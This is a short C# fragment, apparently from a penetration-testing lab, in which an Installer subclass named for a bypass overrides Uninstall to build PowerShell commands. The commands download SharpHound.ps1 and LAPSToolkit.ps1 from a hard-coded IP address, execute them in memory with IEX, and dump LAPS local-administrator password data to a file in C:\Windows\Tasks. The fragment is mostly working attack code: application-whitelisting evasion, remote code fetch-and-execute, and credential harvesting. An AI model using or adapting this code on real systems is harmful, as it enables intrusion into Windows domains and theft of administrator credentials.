...
namespace Bypass
{
    ...
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            ...
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220/SharpHound.ps1') | IEX; Invoke-BloodHound -CollectionMethod All";
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220/LAPSToolkit.ps1') | IEX; Get-LAPSComputers | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
